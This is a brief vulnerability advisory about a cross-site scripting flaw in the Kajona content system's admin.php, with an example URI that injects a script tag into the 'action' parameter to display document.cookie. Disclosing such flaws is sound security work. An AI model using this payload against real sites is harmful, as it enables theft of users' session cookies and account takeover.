Kajona 'admin.php' Cross Site Scripting Vulnerability

Attackers can exploit this issue by enticing an unsuspecting victim to follow a malicious URI.

The following example URI is available:

http://www.example.com/index.php?admin=1&amp;module=right&amp;action=change%3Cscript%3Ealert%28document.cookie%29%3C/script%3E%3C!--&amp;changemodule=dashboard
